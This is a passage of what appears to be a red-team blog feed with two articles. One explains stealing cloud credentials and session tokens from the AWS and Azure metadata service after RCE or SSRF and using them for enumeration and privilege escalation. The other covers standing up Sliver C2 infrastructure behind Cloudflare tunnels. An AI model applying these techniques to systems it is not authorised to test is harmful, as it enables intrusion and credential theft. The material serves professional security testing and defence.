    &lt;a href=&#34;#introduction&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;I’ve recently spoken at several conferences about the changes that are underway within red teaming as a result of cloud migration. My team and I have been delivering majority cloud red team work over the last year and the differences are becoming more apparent by the day. One point I’ve mentioned as ‘controversial’ at several of these events is that cloud migration has actually made AppSec more important than ever. I went some way to trying to explain why I think this is during my talks, but it was something that I felt deserved its own blog post to explore in more detail, with clear examples of how compromise of an on-prem application can look different to a cloud-hosted one.&lt;/p&gt;
&lt;h2&gt;&lt;strong&gt;Disclaimer&lt;/strong&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;disclaimer&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#disclaimer&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;AppSec is a huge domain and one that I will not try to pretend I am currently in a position to speak with authority on as I’ve been focused almost entirely on red teaming over the last few years. Whilst I was an application pentester many moons ago I will be discussing this topic from the perspective of a red teamer / threat actor looking to achieve notable impact from the compromise of an application, namely initial access into an organisation. &lt;/p&gt;
&lt;h2&gt;&lt;strong&gt;The Traditional Approach&lt;/strong&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;the-traditional-approach&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#the-traditional-approach&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;So, before jumping into the cloud-hosted application side of things, let’s briefly discuss the ‘traditional’ approach with which I will be comparing it to. Whilst there are countless ways of hosting a web application, let’s simplify it with a common setup looking something like the below image. &lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/image8.png&#34; title=&#34;image8&#34; alt=&#34;image8&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;image8&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;h6&gt;&lt;em&gt;Reference: &lt;a href=&#34;https://www.wallarm.com/what/what-is-a-dmz&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://www.wallarm.com/what/what-is-a-dmz&lt;/a&gt;&lt;/em&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;reference&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#reference&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h6&gt;&lt;p&gt; &lt;/p&gt;
&lt;p&gt;In the above image we can see that the application is being hosted in the ‘demilitarised zone’ or DMZ as would be typical of an on-premise application. This means that the application is effectively firewalled off from the public internet and enterprise (I usually use the term ‘corporate’) networks except for connections that are strictly necessary. Overall, the intention here is to limit the potential impact that could come from compromising said application, crucially preventing it from having unfettered access into the corporate network. This makes sense, as many applications hosted as such are internet-facing and therefore face a considerable risk of compromise. &lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;In traditional setups, you also have a few common additional layers of security to bypass if you wanted to truly weaponise an application you had compromised. Firstly, you will often be using a dedicated ‘service account’ to run the web server. This account is often only used for running this one web server, and as such has next-to-no permissions to do or access anything else. Finally, you may also find that your exploit (for example a malicious file upload vulnerability) lands in what is called the ‘web root’. This is the directory on the web server in which you store all the contents used for hosting the web server such as config files, images, etc. In these scenarios you may find that the service account you have now compromised cannot even explore the web server’s file system, and instead is strictly limited to the web root. &lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;When you add all of this up, you may find instances where your super awesome remote code execution vulnerability actually has very limited impact in terms of progressing an attack path towards the internal estate and / or critical assets. This exact scenario happened to me on a purple team engagement last year, in which I exploited a vulnerability to get remote code execution on a web server, only to find that it was firewalled off from the corporate network, restricted to the web root, was not domain-joined, and my account had very little permissions. Ultimately this meant that its ‘usefulness’ to me was limited. In fact, one interesting tidbit about that story is that by listing the contents of the web root by ‘time modified’ I was able to discern that several genuine threat actors had also compromised that web server the same way within the last 5 days or so. Naturally this kicked off an IR engagement, which ultimately discovered that the threat actors, like myself, had found limited impact from the compromise of the web server so had installed crypto miners and called it a day. A full write up of this story was posted last year and can be found &lt;a href=&#34;https://labs.jumpsec.com/butting-heads-with-a-threat-actor-on-an-engagement/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;&lt;strong&gt;Cloud-Hosted&lt;/strong&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;cloud-hosted&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#cloud-hosted&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;So, how do things change when we are discussing a cloud-hosted web application? Well, let me start by saying that achieving the same level of defence in depth is certainly possible with a cloud-hosted web application. However, it is our experience that, just like we see overly permissive IAM roles and abusable default settings in every cloud environment we work in, this is rarely as well locked down when it comes to the far less understood world of cloud. &lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;Additionally, beyond the access control and ‘identities’ belonging to these cloud-hosted applications generally not undergoing the same level of scrutiny as on-premise (partly due to ‘least privilege access’ being a mire in the complex world of cloud permissions) we are also able to leverage a nice feature that all cloud providers have implemented in different ways, called the Metadata Service. &lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/image10.png&#34; title=&#34;image10&#34; alt=&#34;image10&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;image10&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;To understand why the metadata service exists I am going to directly quote a great video on the topic from risk3sixty which I urge you to watch &lt;a href=&#34;https://www.youtube.com/watch?v=OaG6wHlhbCQ&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;&lt;em&gt;“It is an internal IP address that is attached to any given EC2 instance by default, that provides a set of information that can be used by application developers who need their application to automatically perform some tasks”&lt;/em&gt; - Risk3Sixty&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;Here, AWS-specific terminology can be interchangeably used with Azure or GCP terminology, as the same features exist for the same reasons across them all. They even all use the same IP address for this &lt;a href=&#34;http://169.254.169.254&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;http://169.254.169.254&lt;/a&gt;, meaning you do not need to know the specific implementations. As risk3sixty put it, the ‘set of information’ which can be requested here is vast, but can include some very useful information to an attacker. Top of mind is the web application’s session token that it uses to authenticate to the cloud environment and perform actions. &lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;In order to access this service, we simply need the ability to issue requests as the web application to this specific endpoint. Once we know which endpoint houses the data that is of interest to us we can generate a request and receive back our information. Specifically, we need to coerce the application into sending a HTTP request to the specific metadata endpoint, and read the result. It should go without saying, therefore, that gaining remote code execution on the web server will in almost all cases be sufficient to retrieve that data. However, this could also be leveraged by less ‘impactful’ (in the traditional sense) vulnerabilities such as SSRF. As you might imagine, this could breathe entirely new life into the potential impact of SSRF vulnerabilities.&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;Cloud vendors realised that these vulnerabilities could potentially open doors to new attack vectors, and so introduced additional controls to protect against them. In all modern metadata services you are required to send additional HTTP headers with specific values, meaning that you are more likely back in the realm of remote code execution. However, in older versions you may find that this is not required, meaning that SSRF could still be sufficient.&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;With the theory out of the way let’s look at some practical examples in Azure and AWS. Here are the steps I would take if I landed on an cloud-hosted web servers.&lt;/p&gt;
&lt;h2&gt;&lt;strong&gt;AWS&lt;/strong&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;aws&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#aws&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;Firstly, check the version of the metadata service in use. As mentioned, older versions (IMDSv1) do not require additional headers, modern versions (IMDSv2) do.&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/image2.png&#34; title=&#34;image2&#34; alt=&#34;image2&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;image2&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;h6&gt;Figure 1:  401 response (missing headers) from main metadata endpoint, meaning IMDSv2 is in use&lt;span class=&#34;absolute -mt-20&#34; id=&#34;figure-1-401-response-missing-headers-from-main-metadata-endpoint-meaning-imdsv2-is-in-use&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#figure-1-401-response-missing-headers-from-main-metadata-endpoint-meaning-imdsv2-is-in-use&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h6&gt;&lt;p&gt; &lt;/p&gt;
&lt;p&gt;As we are working with IMDSv2 we will need to create a bash script or similar which will request the necessary headers, and then include them in subsequent requests which ask for metadata. The script below can be found &lt;a href=&#34;https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf#abusing-ssrf-in-aws-ec2-environment&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/image1.png&#34; title=&#34;image1&#34; alt=&#34;image1&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;image1&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;h6&gt;Figure 2: Bash script for gaining access to IMDSv2 &lt;span class=&#34;absolute -mt-20&#34; id=&#34;figure-2-bash-script-for-gaining-access-to-imdsv2&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#figure-2-bash-script-for-gaining-access-to-imdsv2&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h6&gt;&lt;p&gt; &lt;/p&gt;
&lt;p&gt;Towards the end we can see it requests the ‘credentials’ (think access keys) of the EC2 instance.&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/image4.png&#34; title=&#34;image4&#34; alt=&#34;image4&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;image4&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;h6&gt;Figure 3: EC2 Security Credentials requested&lt;span class=&#34;absolute -mt-20&#34; id=&#34;figure-3-ec2-security-credentials-requested&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#figure-3-ec2-security-credentials-requested&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h6&gt;&lt;p&gt; &lt;/p&gt;
&lt;p&gt;We can then run the script and receive back a plethora of useful information, including the keys and tokens the VM uses. &lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/image5.png&#34; title=&#34;image5&#34; alt=&#34;image5&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;image5&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;h6&gt;Figure 4: Metadata of EC2 instance collected, with EC2 Security Credentials at the bottom.&lt;span class=&#34;absolute -mt-20&#34; id=&#34;figure-4-metadata-of-ec2-instance-collected-with-ec2-security-credentials-at-the-bottom&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#figure-4-metadata-of-ec2-instance-collected-with-ec2-security-credentials-at-the-bottom&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h6&gt;&lt;p&gt; &lt;/p&gt;
&lt;h2&gt;&lt;strong&gt;Azure&lt;/strong&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;azure&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#azure&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;In Azure, this looks similar. Firstly, we generate a generic request asking for information about the VM with the ‘Metadata:true’ HTTP header. &lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/image3.png&#34; title=&#34;image3&#34; alt=&#34;image3&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;image3&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;h6&gt;Figure 5: Metadata being returned from Azure Metadata Service endpoint&lt;span class=&#34;absolute -mt-20&#34; id=&#34;figure-5-metadata-being-returned-from-azure-metadata-service-endpoint&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#figure-5-metadata-being-returned-from-azure-metadata-service-endpoint&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h6&gt;&lt;p&gt; &lt;/p&gt;
&lt;p&gt;As the metadata service is returning information correctly we can request our session token of the managed identity assigned to the VM.&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/image7.png&#34; title=&#34;image7&#34; alt=&#34;image7&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;image7&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;h6&gt;Figure 6: Session token returned for the VM&lt;span class=&#34;absolute -mt-20&#34; id=&#34;figure-6-session-token-returned-for-the-vm&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#figure-6-session-token-returned-for-the-vm&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h6&gt;&lt;p&gt; &lt;/p&gt;
&lt;p&gt;If you are working with an app ‘service’ as opposed to a VM the process is slightly different but still very much possible. In this case you should follow &lt;a href=&#34;https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf#azure-app-service&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;this&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Now, we have these session tokens, so what? You may be thinking that we already had remote code execution on the virtual machine to get to this point so why do we care about the session token? Whilst you may try many of the same attack paths that you could with an on-premise application through this RCE, you now also have another angle of attack. With these session tokens you are able to ‘login’ to the cloud environment (usually without MFA as these are intended to be used by your non-human service accounts). From here, your attack vectors are far more extensive than in most traditional setups. &lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/image9.png&#34; title=&#34;image9&#34; alt=&#34;image9&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;image9&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;h6&gt;Figure 7: Authenticating to the cloud environment as the compromised Azure VM. &lt;span class=&#34;absolute -mt-20&#34; id=&#34;figure-7-authenticating-to-the-cloud-environment-as-the-compromised-azure-vm&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#figure-7-authenticating-to-the-cloud-environment-as-the-compromised-azure-vm&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h6&gt;&lt;p&gt; &lt;/p&gt;
&lt;p&gt;For example, having authenticated to the cloud environment you now have an &lt;em&gt;incredibly&lt;/em&gt; rich API at your disposal to begin looking for further vulnerabilities. This could include simply running  ‘&lt;em&gt;Get-AzResource&lt;/em&gt;’ within Azure, which will reveal all resources that you (as the application) have access to. In the screenshot below we can see that in this case this was access to a KeyVault with app secrets within! &lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/image6.png&#34; title=&#34;image6&#34; alt=&#34;image6&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;image6&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;h6&gt;Figure 8: The compromised application has access to a KeyVault&lt;span class=&#34;absolute -mt-20&#34; id=&#34;figure-8-the-compromised-application-has-access-to-a-keyvault&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#figure-8-the-compromised-application-has-access-to-a-keyvault&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h6&gt;&lt;p&gt; &lt;/p&gt;
&lt;p&gt;Thanks for making that so nice and easy. No searching through config files to find SQL databases and connection strings, then manually crafting individual SQL queries to begin exploitation. Here, we have simply run a single API command and then can run a second to dump all the information that we have. This is just one example of several thousand that you have available to you once you authenticate with common cloud API tooling.&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;But wait there&amp;rsquo;s more…now that we have the session token for the application we can begin using any number of enumeration, post-exploitation or privilege escalation tools that we want from the perspective of the application. No need to install tooling on the device and trip off those pesky EDR’s, we can simply fire up our preferred tooling (think Azurehound, GraphRunner, bf-aws-permissions, etc.) and load in your session token. Of course, this introduces different OPSEC concerns, but bypassing those detections is something we will discuss later this year (hopefully at a conf!).&lt;/p&gt;
&lt;h2&gt;&lt;strong&gt;Cloud Permissions&lt;/strong&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;cloud-permissions&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#cloud-permissions&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;Now let’s rub salt in the wound. We’ve used our compromise to hit the metadata service and load up our favourite tooling with a session token. Access should be strictly limited, like it was on-premise right? Whilst this is true in theory, understanding and implementing fine-grained access controls and restrictions is a tall order in the modern world of highly complex cloud environments. &lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;I would like to call out here how many hundreds of IAM roles there are in most cloud environments, many of them with similar yet opposing permissions. Take a &lt;a href=&#34;https://learn.microsoft.com/en-us/entra/identity/role-based-access-control/permissions-reference&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;look&lt;/a&gt; at just the built-in Azure roles (not to mention any custom ones implemented to fill gaps) which already totals more than 130 options. You can see how reading each of these and understanding the nuanced permissions they have can be taxing, and goes some way to explaining why we so regularly see overly permissive accounts. We often see permissions being used without the full knowledge of what subsets of those permissions can introduce. &lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;To provide a very oversimplified example, we regularly see Global Administrator accounts being very well restricted and kept under lock and key. However, some lesser known roles like ‘Privileged Role Administrator’ and ‘Privileged Authentication Administrator’ both allow a threat actor to escalate privileges to Global Administrator through resetting passwords or assigning roles to attacker-controlled accounts. These permissions may have been assigned more liberally, and compromise of them may not trip off as many alerts. &lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;Ultimately, what I am trying to get at here is that when you combine the complexities of modern cloud environments (which we believe to be largely less well understood than on-prem) with the ability to run a plethora of tooling to identify any misconfigurations or overly permissive accounts (including the application you have compromised!) you often introduce far greater security concerns than you might traditionally do on-premise. Don’t believe me? Read &lt;a href=&#34;https://posts.specterops.io/microsoft-breach-what-happened-what-should-azure-admins-do-da2b7e674ebc&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;this&lt;/a&gt; great deep dive into the Microsoft breach which took place at the start of 2024 in which Microsoft themselves had inadvertently given a legacy app service permissions akin to Global Administrator…&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;The above also introduces an entirely new attack vector within Azure, of applications (service principals) that you compromise potentially having elevated permissions in &lt;em&gt;other&lt;/em&gt; cloud environments beyond just the tenant you are in…but that is a topic for another day.&lt;/p&gt;
&lt;h2&gt;&lt;strong&gt;Serverless Functions&lt;/strong&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;serverless-functions&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#serverless-functions&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;A final point is that with the rise of serverless architecture (AWS Lambda, Azure Functions, etc.) we are starting to get our hands on these more often. Crucially, these can still be thought of as cloud-hosted web applications, and may be vulnerable to the same risks mentioned above depending on the implementation. For example, a member of our red team recently found a way to package and exfiltrate data over DNS from an AWS Lambda that had DENY ALL on all TCP and UDP ports to all ranges. For a write up on that check out &lt;a href=&#34;https://labs.jumpsec.com/whats-in-a-name-writing-custom-dns-tunnelling-protocol-on-the-fly-exploiting-unexpected-aws-lambda-misconfiguration-all-in-a-web-app-pen-test-part-1/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;this&lt;/a&gt; recent labs article. The key point here is that whilst they might not look and feel like traditional web apps, these serverless functions present the same risk to an organisation as a web app and can be used to progress attack paths just as well. &lt;/p&gt;
&lt;h2&gt;&lt;strong&gt;Conclusion&lt;/strong&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;conclusion&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#conclusion&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;In conclusion, I am not suggesting that up until this point AppSec has not been of paramount importance. However, when looking at the arguments presented and the work we’ve been conducting as a team over the last year I feel that the migration to cloud might present yet another watershed moment in AppSec’s journey. Perhaps it will take a notable organisation to be breached via a cloud-hosted application entry point for this point to become salient, but in my eyes it is a matter of when, not if. Thanks for reading and I hope my internal monologue on the topic was of interest!&lt;/p&gt;

      </description>
    </item>
    
    <item>
      <title>Putting the C2 in C2loudflare</title>
      <link>//localhost:1313/articles/2024/06/2024-06-28-putting-the-c2-in-c2loudflare/</link>
      <pubDate>Fri, 28 Jun 2024 00:00:00 +0000</pubDate>
      
      <guid>//localhost:1313/articles/2024/06/2024-06-28-putting-the-c2-in-c2loudflare/</guid>
      <description>
        
        
        &lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;tl;dr&lt;/strong&gt; How to bring up an entire C2 infrastructure with all your tooling and their corresponding redirectors within 5 minutes with the help of Azure Snapshots, Cloudflare and Tmux Resurrect.&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;Every so often I seem to stumble across various ideas, that when combined, massively improve my overall productivity at work. Most of these ideas on their own are nothing new, but when used in tandem can really accelerate your productivity, which is what I wanted to illustrate in today&amp;rsquo;s post. A great example of this is combining Cloudflare workers, apps and tunnels along with Azure VM snapshots and Tmux Resurrect to allow you to bring up an entire C2 infrastructure in 5 mins from a single VM.&lt;/p&gt;
&lt;p&gt;Here at JUMPSEC we have now moved from a system where we would need to allocate project time for infrastructure setup, to it only being something we need to allocate 5 minutes to on day 1 of the test in some cases. Just to help you understand the efficiencies that can be gained with this setup, and how it is worth your investment to continue reading, here is our typical “Day 1” infrastructure setup workflow utilising both Azure and Cloudflare:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Create a Disk in Azure from our saved ‘Template’ snapshot (2 mins)&lt;/li&gt;
&lt;li&gt;Create a VM from that Disk (2 mins)&lt;/li&gt;
&lt;li&gt;Log into the VM and using the &lt;a href=&#34;https://github.com/tmux-plugins/tmux-resurrect&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;tmux-resurrect&lt;/a&gt; plugin all of our servers can be brought up at a keystroke (1 min)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;That’s it, 5 mins of your time. Our previously saved snapshot is a VM saved in time with no client data but containing all of our tools including multiple C2 servers, Ligolo server, http server, Tmux Resurrect, prebuilt payloads for that redirector url and, of course, the Cloudflare connectivity we will focus on in this blog.&lt;/p&gt;
&lt;p&gt;In regards to Tmux Resurrect, think of it as a tool where if you have 6 command prompt panes open in a single tmux session, each with their own C2 server or Cloudflare connectivity command running, that it allows you to save that view. The next time you start tmux and issue the ‘Ctrl-r’ command it ‘resurrects’ that view so it will kick off all the commands that were running previously when you saved them, therefore starting all of your servers instantly. This can be a great time saver.&lt;/p&gt;
&lt;p&gt;Creating snapshots, disks and VM’s from those disks is also super easy following the guidance &lt;a href=&#34;https://dev.to/icebeam7/cloning-azure-vms-1889&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;here&lt;/a&gt;. After you are happy that the template VM has all of your servers operating correctly, with Tmux Resurrect configured to start them, you can just snapshot it. Obviously you can then have multiple snapshot templates connecting to different Cloudflare redirectors to scale this up amongst your team so testers aren’t all using the same Cloudflare Worker.&lt;/p&gt;
&lt;p&gt;From here on in we will focus on the Cloudflare configuration side of things as that is the trickier aspect and the main point of this post. Given this process is meant to simplify life, this post will be more screenshot heavy than textual but I think that’s what people prefer (or at least I hope) in regards to this type of post. What we are fundamentally trying to achieve can be seen in this diagram below, where we can point our tooling whether it be Ligolo, C2 agent or file requests at a single redirector hostname where a Cloudflare Worker will consume the request and redirect it to the desired location on our Cloud VM.&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/image9.png&#34; title=&#34;image9&#34; alt=&#34;image9&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;image9&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Anyway, let’s make a start.&lt;/p&gt;
&lt;p&gt;To begin with, it is worth noting two points. Firstly, the naming conventions used for headers, domains, tunnel names, etc. are all for illustrative purposes so we have made them as obvious as possible, but do adjust them to suit your own needs.&lt;/p&gt;
&lt;p&gt;Secondly I am taking it for granted that creating a VM in Azure or AWS and being able to SSH into it as well as buying a domain from Cloudflare or transferring one to Cloudflare is something that our readers can manage. Therefore, I will focus on explaining the remainder of the infrastructure in the diagram.&lt;/p&gt;
&lt;p&gt;Except for buying a domain name, the cost of the Cloudflare setup is entirely cost free which is an amazing facility to have although you will need to register a credit card on your account. It’s also worth noting that a lot of this setup is one-time only, so if it looks like a scary amount of config, rest reassured at this point that the majority of it is a one-off.&lt;/p&gt;
&lt;p&gt;First things first, you will need to set up a Cloudflare account, so go on over to Cloudflare.com and register an account. If you bought your domain from them or have recently transferred it to them, you will see your domain listed under ‘Websites’ as shown. Please note the highlighted ‘Zero Trust’ area too because that is where we will head to next.&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/image11.png&#34; title=&#34;image11&#34; alt=&#34;image11&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;image11&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;On clicking your domain, you will have visibility of an important piece of information which is your ‘Account ID’. Please note this down as this will be required further on.&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/image10.png&#34; title=&#34;image10&#34; alt=&#34;image10&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;image10&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Now follow the previously highlighted link to the ‘Zero Trust’ area of Cloudflare which is where we will add our various tunnels from the outside world into our cloud virtual machine.&lt;/p&gt;
&lt;p&gt;On entering the ‘Zero Trust’ section choose ‘Networks’ followed by ‘Tunnels’ and click ‘Create a tunnel’ which will create an area where you can create multiple tunnels within it.&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/image13.png&#34; title=&#34;image13&#34; alt=&#34;image13&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;image13&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;At this point you will be asked to create your first tunnel or “Public hostname”. Pictured below are some of the ones we use (which are redacted) but just to give you an idea the first ‘Public hostname’ could be &lt;a href=&#34;https://sliver.yourdomain.com/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://sliver.yourDomain.com&lt;/a&gt; and any Sliver C2 data hitting that endpoint would then be routed through that particular tunnel into the VM where ‘cloudflared’ is running and it will be redirected to the Sliver listener at https://127.0.0.1:443.&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/image12.png&#34; title=&#34;image12&#34; alt=&#34;image12&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;image12&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Just one thing to point out, when you see the number 1 under ‘Origin configurations’ it is just highlighting that some additional config is in place and for the https tunnels that was simply just toggling ‘No TLS Verify’ to ‘Enabled’ to ensure that the data bypasses any TLS checks:&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/image15.png&#34; title=&#34;image15&#34; alt=&#34;image15&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;image15&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Now in the ‘Overview’ area of your Cloudflare tunnels you will be provided with some code that needs to be run on your Cloud VM which will start the tunnels calling out to Cloudflare to allow traffic to traverse them. This includes your very long private token. So, click your OS of choice and using their instructions install the Cloudflare tunnel software which they call ‘cloudflared’ on your VM.&lt;/p&gt;
